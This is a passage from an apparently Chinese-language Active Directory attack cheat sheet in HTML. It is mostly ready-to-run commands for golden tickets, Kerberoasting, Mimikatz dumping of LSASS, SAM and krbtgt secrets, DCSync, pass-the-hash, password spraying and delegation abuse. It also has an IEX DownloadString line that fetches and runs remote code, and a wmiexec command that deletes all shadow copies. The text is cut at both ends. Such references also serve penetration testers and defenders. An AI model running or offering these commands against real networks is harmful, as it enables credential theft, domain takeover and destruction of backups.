key]</span><br>kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /aes128:&lt;krbtgt_aes128_key&gt; /user:&lt;user_name&gt; /ptt<br><span class="hljs-comment">## [AES 256 key] ** 由于微软默认使用的是更安全的加密，可能更隐蔽。</span><br>kerberos::golden /domain:&lt;domain_name&gt; /sid:&lt;domain_sid&gt; /aes256:&lt;krbtgt_aes256_key&gt; /user:&lt;user_name&gt; /ptt<br><br><span class="hljs-comment">## ------------------| Inject TGT with Mimikatz</span><br>kerberos::ptt &lt;ticket_kirbi_file&gt;<br>misc::cmd<br><br><span class="hljs-comment">## ------------------| Inject TGT with Rubeus</span><br>Rubeus.exe ptt /ticket:&lt;ticket_kirbi_file&gt;<br><br><span class="hljs-comment">## ------------------| Get shell</span><br>misc::cmd<br>psexec.exe \\&lt;DC_HostName&gt; cmd.exe<br><span class="hljs-built_in">pushd</span> \\&lt;DC_HostName&gt;\C<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>使用 Metasploit</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 枚举域控制器的krbtgt哈希&amp;SID</span><br>load kiwi<br>dcsync_ntlm krbtgt<br><br><span class="hljs-comment">## ------------------| 配置其他信息</span><br>shell<br>ipconfig /all <br>nbstat <span class="hljs-literal">-a</span> &lt;DNS_SERVERS_IP&gt;<br><br><span class="hljs-comment">## ------------------| 创建票证</span><br>golden_ticket_create <span class="hljs-literal">-d</span> &lt;DOMAIN&gt; <span class="hljs-literal">-u</span> &lt;USER&gt; <span class="hljs-literal">-s</span> &lt;DOMAIN<span class="hljs-literal">-SID</span>&gt; <span class="hljs-literal">-k</span> &lt;HASH&gt; <span class="hljs-literal">-t</span> /tmp/ticket.kirbi<br></code></pre></td></tr></table></figure>
+
+<h3 id="19-Kerberos-Roasting"><a href="#19-Kerberos-Roasting" class="headerlink" title="19.Kerberos Roasting"></a>19.Kerberos Roasting</h3><ul>
+<li>使用 GetUserSPNs.ps1</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| List all SPNs</span><br><span class="hljs-built_in">cp</span> /usr/share/kerberoast/GetUserSPNs.ps1 .<br><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;http://&lt;IP&gt;/GetUserSPNs.ps1&#x27;</span>)<br><span class="hljs-comment">## With PowerView</span><br><span class="hljs-built_in">Get-NetUser</span> | <span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.servicePrincipalName&#125; | <span class="hljs-built_in">select</span> samaccountname,serviceprincipalname | <span class="hljs-built_in">fl</span><br><br><span class="hljs-comment">## ------------------| Request ticket</span><br><span class="hljs-built_in">Add-Type</span> <span class="hljs-literal">-AssemblyName</span> System.IdentityModel<br><span class="hljs-built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="hljs-literal">-ArgumentList</span> &lt;ServicePrincipalNames&gt;        <br><span class="hljs-comment">## 然后票将存储在内存中；</span><br><br><span class="hljs-comment">## ------------------| 使用mimikatz将票证保存到磁盘</span><br>kerberos::list /export<br><br><span class="hljs-comment">## ------------------| Crack hash</span><br>sudo apt<span class="hljs-literal">-get</span> install kerberoast<br>python3 /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt ticket.kirbi<br><br><span class="hljs-comment">## ------------------| If you are willing to crack with john</span><br>git clone https://github.com/nidem/kerberoast<br>python3 kerberoast/kirbi2john.py ticket.kirbi &gt; john<span class="hljs-literal">-ticket</span>.txt<br>john <span class="hljs-literal">--format</span>=krb5tgs john<span class="hljs-literal">-ticket</span>.txt <span class="hljs-literal">-wordlist</span>=/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>使用 Invoke-Kerberoast.ps1</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Download</span><br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/EmpireProject/Empire/master/<span class="hljs-keyword">data</span>/module_source/credentials/<span class="hljs-built_in">Invoke-Kerberoast</span>.ps1            <br><br><span class="hljs-comment">## ------------------| Export ticket</span><br><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-Kerberoast</span>.ps1<br><span class="hljs-built_in">Invoke-Kerberoast</span> <span class="hljs-literal">-Format</span> Hashcat | <span class="hljs-built_in">Select-Object</span> Hash | <span class="hljs-built_in">ConvertTo-Csv</span> <span class="hljs-literal">-NoTypeInformation</span> | <span class="hljs-built_in">Out-File</span> hashes.csv             <br><br><span class="hljs-comment">## ------------------| Crack hash</span><br>hashcat <span class="hljs-literal">-m</span> <span class="hljs-number">13100</span> <span class="hljs-literal">-a0</span> hash.txt /usr/share/wordlists/rockyou.txt <span class="hljs-literal">-O</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>与Rubeus</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Export ticket</span><br>.\Rubeus.exe kerberoast /simple /outfile:hashes.txt<br>.\Rubeus.exe kerberoast /creduser:&lt;Domain&gt;\&lt;UserName&gt; /credpassword:Password123! /outfile:hashes.txt<br><br><span class="hljs-comment">## ------------------| Crack hash</span><br>hashcat <span class="hljs-literal">-m</span> <span class="hljs-number">13100</span> <span class="hljs-literal">-a0</span> hash.txt /usr/share/wordlists/rockyou.txt <span class="hljs-literal">-O</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="20-Mimikatz-exe"><a href="#20-Mimikatz-exe" class="headerlink" title="20.Mimikatz.exe"></a>20.Mimikatz.exe</h3><ul>
+<li>转储所有用户的<code>ntlm</code>哈希值。</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\mimikatz.exe <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;lsadump::sam&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt;&gt; mimikatz<span class="hljs-literal">-sam</span>.out<br>.\mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;lsadump::lsa /patch&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt;&gt; mimikatz<span class="hljs-literal">-lsa</span>.out<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>使用转储密码<code>lsass</code></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Using Mimikatz</span><br>.\mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt;&gt; mimikatz<span class="hljs-literal">-lsass</span>.out       <br><br><span class="hljs-comment">## ------------------| If you have lsass as Mini DuMP or Rekall</span><br>pip3 install pypykatz<br>pypykatz lsa minidump lsass.DMP <span class="hljs-literal">--json</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>导出 Kerberos 票证。</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">kerberos::list /export<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>提取 krbtgt 哈希值</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;lsadump::lsa /inject /name:krbtgt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt;&gt; mimikatz<span class="hljs-literal">-krbtgt</span>.out       <br>.\mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;lsadump::dcsync /domain:&lt;DOMAIN&gt; /user:krbtgt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span> &gt;&gt; mimikatz<span class="hljs-literal">-krbtgt2</span>.out        <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>越过哈希</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 以其他用户身份登录</span><br>privilege::debug<br>sekurlsa::pth /user:[<span class="hljs-type">USER</span>] /domain:[<span class="hljs-type">DOMAIN</span>] /ntlm:[<span class="hljs-type">NTLM</span> <span class="hljs-type">HASH</span>] /run:<span class="hljs-string">&quot;powershell -EncodedCommand SQBF..DFSS==&quot;</span>      <br><br><span class="hljs-comment">## ------------------| 登录到域控制器计算机</span><br>net use \\&lt;DC&gt;<br>.\PsExec.exe <span class="hljs-literal">-accepteula</span> \\&lt;DC&gt; cmd.exe <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>设置账户密码</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\mimikatz.exe <span class="hljs-string">&quot;lsadump::setntlm /user:USERNAME /ntlm:NTLMHASH&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>最流行的 Mimikatz 命令 [来源：<a target="_blank" rel="noopener" href="https://adsecurity.org/?page_id=1821">adsecurity.org</a> ]</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs powershell">CRYPTO::Certificates    <span class="hljs-comment"># 列表/导出证书</span><br>KERBEROS::Golden        <span class="hljs-comment"># 创建金/银/信任票证</span><br>KERBEROS::List          <span class="hljs-comment"># 列出用户内存中的所有用户票证（TGT和TGS）。不需要特殊权限，因为它只显示当前用户的票证。类似于“klist”的功能。</span><br>KERBEROS::PTT           <span class="hljs-comment"># 把票递过去。通常用于注入被盗或伪造的Kerberos票证（金色/银色/信任）。</span><br>LSADUMP::DCSync         <span class="hljs-comment"># 要求DC同步一个对象（获取帐户的密码数据）。无需在DC上运行代码。</span><br>LSADUMP::LSA            <span class="hljs-comment"># 要求LSA服务器检索SAM/AD企业（正常、动态补丁或注入）。用于从域控制器或lsass.dmp转储文件中转储所有Active Directory域凭据。还用于获取特定的帐户凭据，如参数/name:“/name:krbtgt”的krbtgt</span><br>LSADUMP::SAM            <span class="hljs-comment"># 获取SysKey以解密SAM条目（来自注册表或配置单元）。SAM选项连接到本地安全帐户管理器（SAM）数据库并转储本地帐户的凭据。这用于转储Windows计算机上的所有本地凭据。</span><br>LSADUMP::Trust          <span class="hljs-comment"># 要求LSA服务器检索信任验证信息（正常或动态补丁）。转储所有关联信任（域/林）的信任密钥（密码）。</span><br>MISC::AddSid            <span class="hljs-comment"># 添加到用户帐户的SIDHistory。第一个值是目标帐户，第二个值是帐户/组名称（或SID）。移到SID：自2016年5月6日起修改。</span><br>MISC::MemSSP            <span class="hljs-comment"># 注入恶意的Windows SSP以记录经过本地身份验证的凭据。</span><br>MISC::Skeleton          <span class="hljs-comment"># 将Skeleton Key注入域控制器上的LSASS进程。这使得所有用户都可以使用“主密码”（也称为骨架密钥）以及他们的常用密码对骨架密钥修补的DC进行身份验证。</span><br>PRIVILEGE::Debug        <span class="hljs-comment"># 获取调试权限（许多Mimikatz命令都需要此权限或本地系统权限）。</span><br>SEKURLSA::Ekeys         <span class="hljs-comment"># 列出Kerberos加密密钥</span><br>SEKURLSA::Kerberos      <span class="hljs-comment"># 列出所有已验证用户的Kerberos凭据（包括服务和计算机帐户）</span><br>SEKURLSA::Krbtgt        <span class="hljs-comment"># 获取域Kerberos服务帐户（KRBTGT）密码数据</span><br>SEKURLSA::LogonPasswords <span class="hljs-comment"># 列出所有可用的提供程序凭据。这通常显示最近登录的用户和计算机凭据。</span><br>SEKURLSA::Pth           <span class="hljs-comment"># Pass- theHash and Over-Pass-the-Hash</span><br>SEKURLSA::Tickets       <span class="hljs-comment"># 列出所有最近通过身份验证的用户的所有可用Kerberos票证，包括在用户帐户和本地计算机的AD计算机帐户的上下文下运行的服务。与kerberos:：list不同，sekulsa使用内存读取，不受密钥导出限制。sekulsa可以访问其他会话（用户）的票证。</span><br>TOKEN::List             <span class="hljs-comment"># list all tokens of the system</span><br>TOKEN::Elevate          <span class="hljs-comment"># 模拟令牌。用于将权限提升到SYSTEM（默认）或在框中查找域管理令牌</span><br>TOKEN::Elevate /domainadmin <span class="hljs-comment"># 使用域管理员凭据模拟令牌。</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="21-传递哈希-PTH-扩展"><a href="#21-传递哈希-PTH-扩展" class="headerlink" title="21.传递哈希 [PTH] - 扩展"></a>21.传递哈希 [PTH] - 扩展</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| impacket-psexec</span><br>impacket<span class="hljs-literal">-psexec</span> &lt;USER&gt;<span class="hljs-selector-tag">@</span>&lt;IP&gt; <span class="hljs-literal">-hashes</span> &lt;NTML&gt;:&lt;NTML&gt;   <br><br><span class="hljs-comment">## ------------------| pth-winexe</span><br>export SMBHASH=&lt;NTML&gt;:&lt;NTML&gt;<br>pth<span class="hljs-literal">-winexe</span> <span class="hljs-literal">-U</span> administrator //<span class="hljs-number">192.168</span>.<span class="hljs-number">1.101</span> cmd<br>pth<span class="hljs-literal">-winexe</span> <span class="hljs-literal">-U</span> administrator/&lt;NTML&gt;:&lt;NTML&gt; //<span class="hljs-number">192.168</span>.<span class="hljs-number">0.101</span> cmd<br><br><span class="hljs-comment">## ------------------| Metasploit</span><br>use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> SMBPass &lt;NTML&gt;:&lt;NTML&gt;<br><br><span class="hljs-comment">## ------------------| wmiexec.py</span><br>wmiexec.py –hashes &lt;NTML&gt;:&lt;NTML&gt; &lt;DOMAIN&gt;/&lt;USER&gt; @CORPDC01 <span class="hljs-string">&quot;vssadmin delete shadows /all /quiet&quot;</span> &gt; out.txt<br><br><span class="hljs-comment">## ------------------| PsExec.exe</span><br>PsExec.exe <span class="hljs-literal">-accepteula</span> \\&lt;HOST&gt; <span class="hljs-literal">-u</span> &lt;DOMAIN&gt;\&lt;USER&gt; <span class="hljs-literal">-p</span> &lt;NTML&gt;:&lt;NTML&gt; cmd.exe<br>PsExec.exe <span class="hljs-literal">-accepteula</span> \\&lt;HOST&gt; <span class="hljs-literal">-s</span> <span class="hljs-literal">-u</span> &lt;DOMAIN&gt;\&lt;USER&gt; <span class="hljs-literal">-p</span> &lt;NTML&gt;:&lt;NTML&gt; cmd.exe<br><br><span class="hljs-comment">## ------------------| Mimikatz</span><br>Mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::pth /user:&lt;USER&gt; /ntlm:&lt;NTML&gt; /domain:&lt;DOMAIN&gt;&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>                       <br><br><span class="hljs-comment">## ------------------| xfreerdp </span><br>xfreerdp /u:&lt;USER&gt; /d:&lt;DOMAIN&gt; /pth:&lt;NTML&gt;:&lt;NTML&gt; /v:&lt;IP&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="22-Powermad-ps1​"><a href="#22-Powermad-ps1​" class="headerlink" title="22.Powermad.ps1​"></a>22.Powermad.ps1<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1"><strong>​</strong></a></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Add fake machine</span><br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/Kevin<span class="hljs-literal">-Robertson</span>/Powermad/master/Powermad.ps1<br><span class="hljs-built_in">Import-Module</span> Powermad.ps1<br><span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> &lt;FakeComputerName&gt; <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>) <span class="hljs-literal">-Verbose</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="23-密码喷洒"><a href="#23-密码喷洒" class="headerlink" title="23.密码喷洒"></a>23.密码喷洒</h3><ul>
+<li>低速慢速<strong>密码喷洒</strong></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/ZilentJack/Spray<span class="hljs-literal">-Passwords</span>/master/Spray<span class="hljs-literal">-Passwords</span>.ps1          <br>.\Spray<span class="hljs-literal">-Passwords</span>.ps1 <span class="hljs-literal">-Pass</span> Password123! <span class="hljs-literal">-Admin</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Greenwolf/Spray">spray.sh</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Setup</span><br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/Greenwolf/Spray/master/spray.sh<br>chmod +x spray.sh                                                                                                                                   <br><br><span class="hljs-comment">## ------------------| SMB Portal  </span><br>spray.sh <span class="hljs-literal">-smb</span> &lt;targetIP&gt; &lt;USERNAMEs.TXT&gt; &lt;PASSWORDS.TXT&gt; &lt;AttemptsPerLockoutPeriod&gt; &lt;LockoutPeriodInMinutes&gt; &lt;DOMAIN&gt;<br><br><span class="hljs-comment">## ------------------| OWA Portal</span><br>spray.sh <span class="hljs-literal">-owa</span> &lt;targetIP&gt; &lt;usernameList&gt; &lt;passwordList&gt; &lt;AttemptsPerLockoutPeriod&gt; &lt;LockoutPeriodInMinutes&gt; &lt;RequestsFile&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="03-其他命令-漏洞利用"><a href="#03-其他命令-漏洞利用" class="headerlink" title="03.其他命令&#x2F;漏洞利用"></a>03.其他命令&#x2F;漏洞利用</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976">无约束委派 + PrinterBug &#x3D; DCSync</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 侦察</span><br><span class="hljs-comment">## 将以下文件上载到受损的计算机。</span><br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/samratashok/ADModule/master/<span class="hljs-built_in">Import-ActiveDirectory</span>.ps1<br><span class="hljs-built_in">wget</span> https://github.com/samratashok/ADModule/raw/master/Microsoft.ActiveDirectory.Management.dll<br>. .\<span class="hljs-built_in">Import-ActiveDirectory</span>.ps1<br><span class="hljs-built_in">Import-ActiveDirectory</span> <span class="hljs-literal">-ActiveDirectoryModule</span> C:\Full\Path\Microsoft.ActiveDirectory.Management.dll<br><span class="hljs-built_in">Get-ADComputer</span> <span class="hljs-literal">-Filter</span> &#123;TrustedForDelegation <span class="hljs-operator">-eq</span> <span class="hljs-variable">$True</span>&#125;<br><br><span class="hljs-comment">## ------------------| 利用打印机错误</span><br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/h4rithd/PrecompiledBinaries/main/Rubeus/Rubeus.exe<br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/h4rithd/PrecompiledBinaries/main/SpoolSample/MS<span class="hljs-literal">-RPRN</span>.exe<br><br>./Rubeus.exe monitor /interval:<span class="hljs-number">5</span> /nowrap <span class="hljs-comment">## Terminal 01 (shell 01)</span><br>./MS<span class="hljs-literal">-RPRN</span>.exe DC01 DC02 <span class="hljs-comment">## Terminal 02 (shell 02) [need nt authority\system]</span><br><br><span class="hljs-comment">## DC01是我们想要折衷的域控制器。</span><br><span class="hljs-comment">## DC02是我们控制的启用了委派的机器。</span><br>tasklist /SVC | findstr Rubeus.exe<br>taskkill /F /PID &lt;PID&gt;<br><br><span class="hljs-comment">## ------------------| Get TGT</span><br><span class="hljs-comment">## [need nt authority\system]</span><br>./Rubeus.exe ptt /ticket:doIFyDCCBcSgAw.....sdoIFyDC== <br>./Rubeus.exe klist<br><br><span class="hljs-comment">## ------------------| DCSync </span><br>./mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync&quot;</span> <span class="hljs-string">&quot;/user:&lt;USERNAME&gt;\krbtgt&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>基于资源的约束委派 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation">域升级</a></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Identify the vulnarability</span><br><span class="hljs-comment">### 如果您在计算机上有GenericAll/GenericWrite/Write对象，欢迎您！！</span><br><span class="hljs-comment">### Check if the value is 10?</span><br><span class="hljs-built_in">Get-DomainObject</span> <span class="hljs-literal">-Identity</span> <span class="hljs-string">&quot;dc=domain,dc=local&quot;</span> <span class="hljs-literal">-Domain</span> domain.local | <span class="hljs-built_in">select</span> ms<span class="hljs-literal">-ds-machineaccountquota</span><br><span class="hljs-comment">### 检查操作系统是否大于或等于Windows 2012 </span><br><span class="hljs-built_in">Get-DomainController</span> | <span class="hljs-built_in">select</span> OSVersion<br><br><span class="hljs-comment">## ------------------| Exploit [PART I]</span><br><span class="hljs-built_in">Import-Module</span> ./Powermad.ps1<br><span class="hljs-comment">### 在域内创建新的伪计算机对象</span><br><span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> FAKEMACHINE <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&#x27;123456&#x27;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>) <span class="hljs-literal">-Verbose</span><br><span class="hljs-built_in">Get-DomainComputer</span> FAKEMACHINE<br><span class="hljs-comment">### Using AD PowerShell module, give the new fake computer object the Constrained Delegation privilege.</span><br><span class="hljs-built_in">Set-ADComputer</span> &lt;TargetComputer&gt; <span class="hljs-literal">-PrincipalsAllowedToDelegateToAccount</span> FAKEMACHINE<span class="hljs-variable">$</span><br><span class="hljs-built_in">Get-ADComputer</span> &lt;TargetComputer&gt; <span class="hljs-literal">-Properties</span> PrincipalsAllowedToDelegateToAccount<br><br><span class="hljs-comment">## ------------------| Exploit [PART II]</span><br><span class="hljs-comment">### Performing a complete S4U attack</span><br>.\Rubeus.exe hash /password:<span class="hljs-number">123456</span> /user:FAKEMACHINE<span class="hljs-variable">$</span> /domain:domain.local<br><span class="hljs-comment">### Note-down the aes256_cts_hmac_sha1 hash</span><br><br><span class="hljs-comment">## ------------------| Exploit [PART III]</span><br><span class="hljs-comment">### generate a ccached TGT and used KERB5CCNAME pass the ccahe file for the requested service. </span><br>impacket<span class="hljs-literal">-getST</span> domain.local/FAKEMACHINE <span class="hljs-literal">-dc-ip</span> &lt;IP&gt; <span class="hljs-literal">-impersonate</span> administrator <span class="hljs-literal">-spn</span> http/victim.domain.local <span class="hljs-literal">-aesKey</span> &lt;AES_KEY&gt;<br>export KRB5CCNAME=administrator.ccache<br><span class="hljs-comment">### We must set /etc/hosts file to map the domain name &amp; hostname to the victim’s IP address</span><br>impacket<span class="hljs-literal">-smbexec</span> domain.local/administrator@victim.domain.local <span class="hljs-literal">-no-pass</span> <span class="hljs-literal">-k</span><br>impacket<span class="hljs-literal">-psexec</span> domain.local/administrator@victim.domain.local <span class="hljs-literal">-no-pass</span> <span class="hljs-literal">-k</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>将共享挂载到 Linux 机器</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Setup</span><br>sudo apt<span class="hljs-literal">-get</span> install cifs<span class="hljs-literal">-utils</span><br>sudo mkdir /mnt/shares<br>sudo chmod <span class="hljs-number">777</span> /mnt/shares<br><br><span class="hljs-comment">## ------------------| Mount shares</span><br>sudo <span class="hljs-built_in">mount</span> <span class="hljs-literal">-t</span> cifs //<span class="hljs-variable">$IP</span>/Users /mnt/shares<br>sudo <span class="hljs-built_in">mount</span> <span class="hljs-literal">-t</span> cifs <span class="hljs-literal">-o</span> <span class="hljs-string">&#x27;username=L.Frost,password=welcome2019&#x27;</span> //<span class="hljs-variable">$IP</span>/Users /mnt/shares                    <br><br><span class="hljs-comment">## ------------------| Mount Options</span><br><span class="hljs-literal">-o</span> <span class="hljs-string">&#x27;username=L.Frost,password=welcome2019&#x27;</span><br><span 